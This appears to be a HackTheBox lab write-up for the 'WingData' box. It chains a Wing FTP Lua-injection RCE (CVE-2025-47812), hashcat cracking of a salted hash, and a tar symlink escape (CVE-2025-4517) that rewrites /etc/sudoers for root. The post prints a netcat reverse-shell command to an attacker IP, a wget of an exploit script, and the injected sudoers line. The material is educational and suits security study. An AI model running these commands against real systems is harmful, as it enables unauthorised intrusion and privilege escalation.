---
title: "HTB WingData — Lua Injection RCE, Hash Cracking & Tar Symlink to Root"
date: 2026-06-23
categories: [HackTheBox, Linux]
tags: [htb, linux, wing-ftp, lua-injection, cve-2025-47812, cve-2025-4517, tar-symlink, hashcat, sudo-abuse, debian]
classes: wide
header:
  image: /assets/images/WINGDATA/wingdata.png
  teaser: /assets/images/WINGDATA/wingdata.png
---

<style>
p { text-align: justify; }
</style>

# HTB WingData

**Difficulty:** Easy  
**OS:** Linux (Debian)  
**Platform:** HackTheBox  
**Category:** Web / FTP / Privilege Escalation  
**Status:** Active

---

## Overview

WingData is a Linux box built around a Wing FTP Server installation and a classic tar extraction vulnerability. The path goes: discover an FTP web client on a subdomain → exploit a NULL byte Lua injection for unauthenticated RCE → get an interactive shell → enumerate Wing FTP's directory structure → extract and crack credentials → SSH in → abuse a sudo backup script vulnerable to tar symlink attacks → overwrite sudoers → root.

Two CVEs, clean chain. No rabbit holes if you enumerate properly.

---

## Reconnaissance

### Nmap

```bash
nmap -sV -sC -T4 -p- --min-rate 10000 10.129.244.106
```

```
PORT   STATE SERVICE  VERSION
22/tcp open  ssh      OpenSSH
80/tcp open  http     Apache
```

Two ports. Apache on 80 — web enumeration first.

```bash
echo "10.129.244.106 wingdata.htb" >> /etc/hosts
curl http://wingdata.htb/
```

Corporate site for "Wing Data Solutions" — a file sharing company. The **Client Portal** button links to `ftp.wingdata.htb`. That's the real target.

```bash
echo "10.129.244.106 ftp.wingdata.htb" >> /etc/hosts
curl http://ftp.wingdata.htb/
```

Redirects to `login.html` — a web-based FTP client interface.

---

### Version Fingerprint

The page footer hands us exactly what we need:
![ftp](/assets/images/WINGDATA/ftp.png)

```
Wing FTP Server v7.4.3
```

```bash
searchsploit wing ftp
```
![searchsploit](/assets/images/WINGDATA/search.png)

```
Wing FTP Server 7.4.3 - Unauthenticated Remote Code Execution (RCE) | CVE-2025-47812
```

Exact version, exact CVE. Moving.

---

## Initial Access — CVE-2025-47812 (Lua Injection)

### How It Works

The `loginok.html` endpoint doesn't properly sanitize the username parameter. A NULL byte followed by Lua code gets written directly into session files on the server. When those sessions are later processed via `/dir.html`, the injected Lua executes with Wing FTP's process privileges — no authentication required.

### Confirming RCE

```bash
searchsploit -m 52347
python3 52347.py -u http://ftp.wingdata.htb -c "whoami"
# wingftp

python3 52347.py -u http://ftp.wingdata.htb -c "pwd"
# /opt/wftpserver

python3 52347.py -u http://ftp.wingdata.htb -c "hostname"
# wingdata
```
![RCE](/assets/images/WINGDATA/rce.png)

RCE confirmed. The exploit executes one command at a time — not enough for proper enumeration. We need an interactive shell.

---

### Getting an Interactive Shell

Bash reverse shell payloads kept breaking inside the Lua injection context due to nested quote issues. `nc` with `-e` doesn't have the same quoting problem:

```bash
# On Kali
nc -lvnp 4444

# Trigger the reverse shell
python3 52347.py -u http://ftp.wingdata.htb -c "nc 10.10.16.32 4444 -e /bin/bash"
```

Shell landed as `wingftp`. Upgraded it:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z
stty raw -echo; fg
```
PS:I found out there was another user other than wingftp by reading the passwd file
![PASSWD](/assets/images/WINGDATA/passwd.png)

---

## User Flag — Enumeration and Credential Extraction

### Exploring the Wing FTP Installation

We landed in `/opt/wftpserver` — the Wing FTP installation root. Started enumerating from where we actually were rather than guessing paths:

```bash
ls -la
```

```
Data/
Log/
lua/
session/
session_admin/
version.txt
webadmin/
webclient/
wftpserver
```

`Data/` is the obvious first place to check — that's where any application stores its configuration and user data.

```bash
ls -la Data/
```

```
1/               (domains — Wing FTP organises users by domain)
_ADMINISTRATOR/
settings.xml
bookmark_db
```

```bash
ls -la Data/1/
```

```
users/
```

```bash
ls -la Data/1/users/
```

```
anonymous.xml
john.xml
maria.xml
steve.xml
wacky.xml
```

The username `wacky` matched the system user we'd already seen in `/etc/passwd`. That's the one to read.

---

### Extracting wacky's Credentials

```bash
cat Data/1/users/wacky.xml
```
![XML](/assets/images/WINGDATA/xml.png)

```xml
<Password>32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca</Password>
<EnableAccount>1</EnableAccount>
<LoginCount>2</LoginCount>
```

Hash extracted. A couple of things worth noting from the XML: the account is active, and the last login came from `127.0.0.1` — meaning wacky was accessing the FTP server locally, which makes SSH reuse even more likely.

---

### Cracking the Hash

Wing FTP uses a custom hash format — not raw SHA256. Mode 1400 failed. Mode 1410 is the correct one, and it needs the `:WingFTP` suffix appended as the salt:

```bash
echo '32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP' > wacky.hash
hashcat -m 1410 wacky.hash /usr/share/wordlists/rockyou.txt --force -O
```

```
!#7Blushing^*Bride5
```

Cracked.

---

### SSH Access

```bash
sshpass -p '!#7Blushing^*Bride5' ssh -o StrictHostKeyChecking=no wacky@10.129.244.106
```

```bash
cat ~/user.txt
[REDACTED]
```

**User flag captured.** ✅

---

## Privilege Escalation — CVE-2025-4517 (Tar Symlink Attack)

### Sudo Enumeration

```bash
sudo -l
```

```
User wacky may run the following commands on wingdata:
    (root) NOPASSWD: /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py *
```

A backup restore script, running as root, with a wildcard on the arguments. Classic setup.

---

### The Vulnerability

`restore_backup_clients.py` extracts `.tar` archives using Python's `tar.extractall()` —> which follows symlinks by default. By crafting a malicious tar archive containing a symlink chain that escapes the extraction directory, we can overwrite arbitrary system files as root.

Target: `/etc/sudoers`.

---

### Exploitation

```bash
cd /tmp
wget http://10.10.16.32:8080/CVE-2025-4517-POC.py
python3 CVE-2025-4517-POC.py
```

The exploit:

- Builds a nested directory structure inside the archive
- Creates a symlink chain that escapes the intended extraction path
- Creates a hardlink pointing to `/etc/sudoers`
- Injects `wacky ALL=(ALL) NOPASSWD: ALL` into the sudoers content
- Deploys the malicious tar to `/opt/backup_clients/backups/backup_9999.tar`
- The restore script extracts the archive as root — symlink overwrites `/etc/sudoers`

---

## Root Flag

```bash
sudo /bin/bash
```

```bash
cat /root/root.txt
[REDACTED]
```
![root](/assets/images/WINGDATA/root.png)

**Root flag captured. Box pwned.** ✅

---

## Full Attack Chain

```
Vhost link from main site → ftp.wingdata.htb (Wing FTP Server v7.4.3)
  │
  CVE-2025-47812: NULL byte + Lua injection → unauthenticated RCE
  └─ nc reverse shell → wingftp interactive shell
     └─ Enumerate /opt/wftpserver/Data/1/users/
        └─ Read wacky.xml → crack hash (mode 1410) → !#7Blushing^*Bride5
           │
           SSH as wacky
           └─ USER FLAG ✅
              │
              sudo -l → restore_backup_clients.py * as root (NOPASSWD)
              │
              CVE-2025-4517: malicious tar → symlink escape → overwrite /etc/sudoers
              └─ wacky ALL=(ALL) NOPASSWD: ALL
                 └─ sudo /bin/bash → ROOT FLAG ✅
```

---

## Credentials Found

| Username | Password | Source | Purpose |
|---|---|---|---|
| wacky | !#7Blushing^*Bride5 | Cracked from Wing FTP XML | SSH + sudo |
| admin | (hash only) | Wing FTP admin XML | Admin panel |

---



## What Did We Learn?

**1. Page footers leak version numbers**  
Wing FTP displayed its exact version on the login page. That one string led directly to the right exploit with no guessing. Always read the full page — headers, footers, comments, meta tags.

**2. Enumerate from where you land**  
We were already in `/opt/wftpserver`. The `Data/` folder was right there. Proper enumeration of the application's own directory structure found the credentials naturally — no guessing, no prior knowledge of the path required. Work with what the filesystem shows you.

**3. Quote issues in injections need simpler payloads**  
Bash reverse shells with nested quotes broke the Lua injection context. `nc -e /bin/bash` has no quoting complexity and worked cleanly. When a payload fails due to character handling, simplify before assuming the vulnerability doesn't work.

**4. Custom hash formats need the right Hashcat mode**  
Mode 1400 is raw SHA256. Mode 1410 is SHA256 with a salt — Wing FTP specifically uses `:WingFTP` as the salt. Using the wrong mode wastes time and gives false negatives. When a hash doesn't crack on common modes, look up the application's specific format before assuming the password isn't in the wordlist.

**5. Sudo wildcards are dangerous**  
`restore_backup_clients.py *` with NOPASSWD means we control the arguments. Even if we couldn't modify the script itself, the wildcard let us point it at a malicious archive. Wildcards in sudo rules deserve scrutiny every time.

**6. `tar.extractall()` without symlink protection is a known vulnerability**  
Python's tarfile module follows symlinks by default during extraction. Any script that extracts archives with elevated privileges without explicitly checking for path traversal or symlink attacks is a privesc waiting to happen. This pattern shows up constantly in backup and restore tooling.

**7. Password reuse from FTP to SSH is real**  
wacky's FTP password worked for SSH without modification. Always try extracted credentials against SSH — it's the most common lateral movement path on Linux boxes.

---

<img src="https://media.giphy.com/media/v1.Y2lkPWVjZjA1ZTQ3eDVncXVlbmxocmhsa2I3ZHRma3BueXRkaXJvYzFib2pibDhpdDJqZiZlcD12MV9naWZzX3NlYXJjaCZjdD1n/bk8UGCysurqC2gmJ0o/giphy.gif"
     style="width: 100%; height: auto;"
     alt="pwned">

*Written by 0x5h4q | [0x5h4q.github.io](https://0x5h4q.github.io)*
